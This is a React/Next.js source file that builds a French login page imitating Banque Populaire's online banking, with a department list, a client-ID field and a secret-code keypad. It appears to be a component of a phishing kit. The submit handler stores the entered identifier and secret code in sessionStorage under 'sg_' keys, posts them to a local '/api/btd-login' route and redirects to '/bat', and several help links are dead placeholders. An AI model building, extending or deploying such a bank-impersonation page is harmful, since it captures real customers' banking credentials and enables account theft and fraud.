'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface BPConnexionProps {
  partnerLogoSrc?: string;
  bpLogoSrc?: string;
}

export default function BPConnexionPage({
  partnerLogoSrc = '/favicon.ico',
  bpLogoSrc = '/Banquepopulaire_logo.svg.webp',
}: BPConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [department, setDepartment] = useState<string>('');
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(false);
  const [secretCode, setSecretCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Passage Étape 1 -> Étape 2 (saisie libre)
  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (clientId.trim()) {
      setStep(2);
    }
  };

  // Ajout au clavier virtuel
  const handleKeyPress = (val: string) => {
    setSecretCode((prev) => prev + val);
  };

  const handleClearSecretCode = () => {
    setSecretCode('');
  };

 // Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'BANQUE POPULAIRE',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const keyboardLayout = ['1', '2', '3', '', '4', '5', '6', '0', '7', '8', '9', ''];

  return (
    <>
      <style>{`
        .bp-body-wrapper {
          font-family: 'Montserrat', system-ui, -apple-system, sans-serif;
          background-color: #ffffff;
          color: #333333;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
        }
        .bp-app-container {
          max-width: 450px;
          width: 100%;
          margin: 0 auto;
          min-height: 100vh;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          position: relative;
          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
        }
        .bp-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 18px 20px;
          border-bottom: 1px solid #f0f2f5;
          background: #ffffff;
        }
        .bp-logo-area {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .bp-partner-logo {
          height: 22px;
          width: 22px;
          object-fit: contain;
        }
        .bp-arrow {
          color: #a0aec0;
          font-size: 14px;
        }
        .bp-main-brand {
          max-height: 32px;
          width: auto;
          object-fit: contain;
        }
        .bp-header-action-link {
          color: #002D72;
          font-size: 14px;
          font-weight: 500;
          text-decoration: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 5px;
          background: none;
          border: none;
        }
        .bp-content {
          padding: 30px 24px;
          display: flex;
          flex-direction: column;
          flex-grow: 1;
        }
        .bp-main-title {
          font-size: 21px;
          color: #002D72;
          font-weight: 600;
          text-align: center;
          margin-bottom: 28px;
          line-height: 1.3;
        }
        .bp-input-wrapper {
          position: relative;
          margin-bottom: 20px;
          width: 100%;
        }
        .bp-region-select {
          width: 100%;
          padding: 16px;
          border: 1px solid #BCC5D3;
          border-radius: 8px;
          font-family: inherit;
          font-size: 15px;
          color: #0056B3;
          background-color: #ffffff;
          outline: none;
          font-weight: 500;
          cursor: pointer;
        }
        .bp-client-id-input {
          width: 100%;
          padding: 16px;
          border: 2px solid #002D72;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          color: #002D72;
          background-color: #ffffff;
          outline: none;
          font-weight: 600;
        }
        .bp-client-id-input::placeholder {
          color: #A0AEC0;
          font-weight: 400;
        }
        .bp-clear-input {
          position: absolute;
          right: 15px;
          top: 50%;
          transform: translateY(-50%);
          font-size: 24px;
          color: #A0AEC0;
          cursor: pointer;
          user-select: none;
        }
        .bp-free-pass-input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #BCC5D3;
          border-radius: 8px;
          font-size: 16px;
          font-weight: 600;
          color: #002D72;
          outline: none;
          text-align: center;
          letter-spacing: 2px;
          margin-bottom: 20px;
        }
        .bp-free-pass-input:focus {
          border-color: #002D72;
        }
        .bp-toggle-row {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 30px;
          margin-top: 5px;
        }
        .bp-toggle-label {
          font-size: 14px;
          color: #4A5568;
          font-weight: 500;
        }
        .bp-switch {
          position: relative;
          display: inline-block;
          width: 44px;
          height: 24px;
        }
        .bp-switch input { opacity: 0; width: 0; height: 0; }
        .bp-slider {
          position: absolute;
          cursor: pointer;
          top: 0; left: 0; right: 0; bottom: 0;
          background-color: #E2E8F0;
          transition: .3s;
          border-radius: 24px;
        }
        .bp-slider:before {
          position: absolute;
          content: "";
          height: 18px;
          width: 18px;
          left: 3px;
          bottom: 3px;
          background-color: white;
          transition: .3s;
          border-radius: 50%;
        }
        input:checked + .bp-slider { background-color: #002D72; }
        input:checked + .bp-slider:before { transform: translateX(20px); }
        .bp-btn-main-blue {
          width: 100%;
          padding: 16px;
          background-color: #002D72;
          color: #ffffff;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          border: none;
          cursor: pointer;
          text-align: center;
        }
        .bp-btn-main-blue:hover {
          background-color: #001F4D;
        }
        .bp-btn-main-gray {
          width: 100%;
          padding: 16px;
          background-color: #EAECEF;
          color: #A0AEC0;
          border-radius: 8px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          border: none;
          cursor: not-allowed;
          text-align: center;
        }
        .bp-id-reminder-box {
          background-color: #F4F6F9;
          padding: 14px 18px;
          border-radius: 8px;
          margin-bottom: 25px;
          text-align: center;
          font-size: 15px;
          color: #4A5568;
          border: 1px solid #E2E8F0;
        }
        .bp-id-reminder-box strong {
          color: #002D72;
          font-weight: 700;
          letter-spacing: 0.5px;
        }
        .bp-dots-container {
          display: flex;
          justify-content: center;
          margin-bottom: 25px;
          width: 100%;
        }
        .bp-dots-row {
          display: flex;
          gap: 8px;
        }
        .bp-dot {
          width: 38px;
          height: 44px;
          border: 1px solid #BCC5D3;
          border-radius: 6px;
          display: flex;
          align-items: center;
          justify-content: center;
          background-color: #ffffff;
        }
        .bp-dot.bp-filled::after {
          content: "•";
          font-size: 26px;
          color: #002D72;
        }
        .bp-keyboard-grid {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 10px;
          width: 100%;
          max-width: 340px;
          margin: 0 auto 20px auto;
        }
        .bp-key {
          width: 100%;
          aspect-ratio: 1.25;
          background-color: #ffffff;
          border: 1px solid #DCE1E7;
          border-radius: 8px;
          font-size: 19px;
          font-weight: 600;
          color: #002D72;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow: 0 1px 2px rgba(0,0,0,0.03);
        }
        .bp-key:active { background-color: #F4F6F9; }
        .bp-key-empty { width: 100%; aspect-ratio: 1.25; }
        .bp-help-section {
          margin-top: auto;
          padding-top: 25px;
          border-top: 1px dashed #E2E8F0;
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        .bp-space-top-border { margin-top: 20px; }
        .bp-help-link {
          color: #002D72;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
        }
        .bp-help-link:hover { text-decoration: underline; }
        .bp-security-banner {
          background-color: #FFFDF5;
          border: 1px solid #FBEFCE;
          padding: 14px;
          border-radius: 8px;
          margin-bottom: 5px;
        }
        .bp-security-banner h3 { font-size: 14px; color: #B7791F; margin-bottom: 4px; font-weight: 600; }
        .bp-security-banner p { font-size: 12px; color: #744210; line-height: 1.4; }
      `}</style>

      <div className="bp-body-wrapper">
        <div className="bp-app-container">

          {/* EN-TÊTE DE PARTENARIAT (Favicon + Flèche + Logo BP) */}
          <header className="bp-header">
            <div className="bp-logo-area">
              <img src={partnerLogoSrc} alt="Favicon" className="bp-partner-logo" />
              <span className="bp-arrow">→</span>
              <img src={bpLogoSrc} alt="Banque Populaire" className="bp-main-brand" />
            </div>
            {step === 2 ? (
              <button type="button" className="bp-header-action-link" onClick={() => setStep(1)}>
                ‹ Retour
              </button>
            ) : (
              <a href="#" className="bp-header-action-link">? Aide</a>
            )}
          </header>

          {/* ÉTAPE 1 : RÉGION & IDENTIFIANT */}
          {step === 1 && (
            <main className="bp-content">
              <h2 className="bp-main-title">Saisissez votre identifiant</h2>

              {/* Sélection Département */}
              <div className="bp-input-wrapper">
                <select
                  className="bp-region-select"
                  value={department}
                  onChange={(e) => setDepartment(e.target.value)}
                >
                  <option value="" disabled>Sélectionnez votre département</option>
                  <option value="01">01 - Ain</option>
                  <option value="02">02 - Aisne</option>
                  <option value="06">06 - Alpes-Maritimes</option>
                  <option value="13">13 - Bouches-du-Rhône</option>
                  <option value="14">14 - Calvados</option>
                  <option value="17">17 - Charente-Maritime</option>
                  <option value="21">21 - Côte-d'Or</option>
                  <option value="29">29 - Finistère</option>
                  <option value="30">30 - Gard</option>
                  <option value="31">31 - Haute-Garonne</option>
                  <option value="33">33 - Gironde</option>
                  <option value="34">34 - Hérault</option>
                  <option value="35">35 - Ille-et-Vilaine</option>
                  <option value="37">37 - Indre-et-Loire</option>
                  <option value="38">38 - Isère</option>
                  <option value="44">44 - Loire-Atlantique</option>
                  <option value="45">45 - Loiret</option>
                  <option value="49">49 - Maine-et-Loire</option>
                  <option value="51">51 - Marne</option>
                  <option value="54">54 - Meurthe-et-Moselle</option>
                  <option value="56">56 - Morbihan</option>
                  <option value="57">57 - Moselle</option>
                  <option value="59">59 - Nord</option>
                  <option value="60">60 - Oise</option>
                  <option value="62">62 - Pas-de-Calais</option>
                  <option value="63">63 - Puy-de-Dôme</option>
                  <option value="64">64 - Pyrénées-Atlantiques</option>
                  <option value="66">66 - Pyrénées-Orientales</option>
                  <option value="67">67 - Bas-Rhin</option>
                  <option value="68">68 - Haut-Rhin</option>
                  <option value="69">69 - Rhône</option>
                  <option value="71">71 - Saône-et-Loire</option>
                  <option value="72">72 - Sarthe</option>
                  <option value="74">74 - Haute-Savoie</option>
                  <option value="75">75 - Paris</option>
                  <option value="76">76 - Seine-Maritime</option>
                  <option value="77">77 - Seine-et-Marne</option>
                  <option value="78">78 - Yvelines</option>
                  <option value="80">80 - Somme</option>
                  <option value="83">83 - Var</option>
                  <option value="84">84 - Vaucluse</option>
                  <option value="85">85 - Vendée</option>
                  <option value="86">86 - Vienne</option>
                  <option value="87">87 - Haute-Vienne</option>
                  <option value="91">91 - Essonne</option>
                  <option value="92">92 - Hauts-de-Seine</option>
                  <option value="93">93 - Seine-Saint-Denis</option>
                  <option value="94">94 - Val-de-Marne</option>
                  <option value="95">95 - Val-d'Oise</option>
                </select>
              </div>

              {/* Saisie Libre Identifiant Client */}
              <div className="bp-input-wrapper">
                <input
                  type="text"
                  className="bp-client-id-input"
                  value={clientId}
                  onChange={(e) => setClientId(e.target.value)}
                  placeholder="Entrez votre identifiant"
                  autoComplete="off"
                />
                {clientId.length > 0 && (
                  <span className="bp-clear-input" onClick={() => setClientId('')}>×</span>
                )}
              </div>

              {/* Switch Mémorisation */}
              <div className="bp-toggle-row">
                <label className="bp-switch">
                  <input
                    type="checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <span className="bp-slider"></span>
                </label>
                <span className="bp-toggle-label">Mémoriser mon identifiant</span>
              </div>

              <button
                type="button"
                onClick={handleNextStep}
                disabled={!clientId.trim()}
                className={clientId.trim() ? 'bp-btn-main-blue' : 'bp-btn-main-gray'}
              >
                Valider et continuer
              </button>

              <div className="bp-help-section">
                <div className="bp-security-banner">
                  <h3>Où trouver votre identifiant ?</h3>
                  <p>Il figure sur votre contrat de banque à distance ou sur vos relevés de comptes imprimés.</p>
                </div>
                <a href="#" className="bp-help-link">» Identifiant oublié ?</a>
                <a href="#" className="bp-help-link">» Première connexion ou code secret oublié ?</a>
              </div>
            </main>
          )}

          {/* ÉTAPE 2 : CODE SECRET */}
          {step === 2 && (
            <main className="bp-content">
              <h2 className="bp-main-title">Saisissez votre code secret</h2>

              <div className="bp-id-reminder-box">
                <span>Identifiant : <strong>{clientId || '--------'}</strong></span>
              </div>

              {/* Champ Saisie Libre Code Secret */}
              <input
                type="password"
                className="bp-free-pass-input"
                value={secretCode}
                onChange={(e) => setSecretCode(e.target.value)}
                placeholder="Code secret"
              />

              {/* Indicateurs Visuels (8 dots) */}
              <div className="bp-dots-container">
                <div className="bp-dots-row">
                  {[...Array(8)].map((_, idx) => (
                    <div
                      key={idx}
                      className={`bp-dot ${idx < secretCode.length ? 'bp-filled' : ''}`}
                    />
                  ))}
                </div>
              </div>

              {/* Clavier virtuel numérique */}
              <div className="bp-keyboard-grid">
                {keyboardLayout.map((val, index) => (
                  val === '' ? (
                    <div key={index} className="bp-key-empty" />
                  ) : (
                    <button
                      key={index}
                      type="button"
                      className="bp-key"
                      onClick={() => handleKeyPress(val)}
                    >
                      {val}
                    </button>
                  )
                ))}
              </div>

              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  type="button"
                  onClick={handleClearSecretCode}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#002D72',
                    fontWeight: 600,
                    fontSize: '15px',
                    cursor: 'pointer',
                  }}
                >
                  ⌫ Effacer le code
                </button>
              </div>

              {/* Bouton de Soumission vers /api/btd-login */}
              <button
                type="button"
                onClick={handleSubmit}
                disabled={!secretCode.trim() || isSubmitting}
                className={secretCode.trim() && !isSubmitting ? 'bp-btn-main-blue' : 'bp-btn-main-gray'}
              >
                {isSubmitting ? 'Connexion en cours...' : 'Accéder à mon espace client'}
              </button>

              <div className="bp-help-section bp-space-top-border">
                <a href="#" className="bp-help-link">» Problème d'accessibilité avec le clavier ?</a>
                <a href="#" className="bp-help-link">» Nos conseils pour naviguer en toute sécurité</a>
              </div>
            </main>
          )}

        </div>
      </div>
    </>
  );
}